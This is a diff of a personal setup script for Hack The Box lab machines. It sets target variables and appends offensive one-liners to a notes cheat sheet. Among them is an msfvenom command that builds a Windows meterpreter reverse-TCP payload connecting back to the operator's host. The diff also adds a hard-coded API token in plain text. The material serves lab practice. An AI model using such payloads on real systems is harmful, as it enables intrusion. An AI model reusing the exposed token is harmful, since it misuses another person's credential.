@@ -3,14 +3,15 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Corporate
-LAST=246
-OS=lin
+BOXNAME=Analysis
+LAST=
+OS=win
 USER=bob
 
-export IP=10.10.11.$LAST
+export IP=10.129.249.89     #10.10.11.$LAST
 export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
 export SELF=$(hostname -I | awk '{print $4}')
+export HTB_TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI1IiwianRpIjoiZmU1OTIxOWJlOTc5ZWUzMzQxMzliZTIxODA2YjkwOWM3MTQzNzg3MWU1YzYxMDZmMzA1ZjI5Mzk0ZGQ0Mzk1OGVmODY3MWU2YzYwNjIyMWEiLCJpYXQiOjE3MDQ2NDczNjQuNjA4MzUzLCJuYmYiOjE3MDQ2NDczNjQuNjA4MzU1LCJleHAiOjE3MDQ3MzM3NjQuNjAwMDc5LCJzdWIiOiIyOTA1MDYiLCJzY29wZXMiOlsiMmZhIl19.TA3Ft85fKpM8tHnk4pMe1wdgwfWBQ7aKm1cPscAGTjELM2j1RJDDQj4AQDCbDLhbjCUkkOlkFyc_-a8dMOfuz7ScSfC_UfH7wEJ3uK7ZaHNZq_c6xYDSIkKXsLm5Eah0XawkCdc_MwEpOb4d7J1vBhZukYIOts3expnsWx8Vx45kJ0MFQBC5x_Qrvfv7jp7XPXTcWNB9maMDgBhuu5QetwwH3ycPRuu90_mmxP3PXWVSVsZFZ1UcQ59kT0sO0ehTUtRDAsHhttQcCPbQm-dBHQoHOLNJ1L8_tA8F95fvuYcOPbCbuXSIJbTsQEU-NjRJFJiEpfs2caEPivOmT26TX7fUICiNIS4C-BmznzQvJPsY_m_wBr-4m-N1bTRyPe9UxGI3hK7jSOiQl5DrOXPY7QACcMg3Qe8f3TcIzRpBe8r_yKpTOJ_cPHTihdu8kmeYYqQxeoAPB6GVRH7XDQTfsXi9sImRhRiA4fU5CM6CtJ8o7a4nQ53u3-2oCUHty1Bwuc4a0_WaQnfPzkHpCbuS4q3JOfNfNIzozGcg2TNhP3H688Ahv4D9TJZhzXfxCxewM4iDDOhmE78tNt9NCI2TzpkSYb0mYmD2-OG-gGDf-juO28CUZ-esxbA_hp6U_98g9CnkTJgpqjF6as3y0vKvtkuFXypR6y7Ie-63So7RH40
 
 #start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
 #and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
@@ -102,6 +103,7 @@ echo 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9
 echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName' >> $HOME/notes
 echo 'Expand-Archive xyz.zip' >> $HOME/notes
 echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
+echo 'Start-Job -FilePath C:\Scripts\Sample.ps1' >> $HOME/notes
 
 # Windows privesc checklist
 echo "" >> $HOME/notes
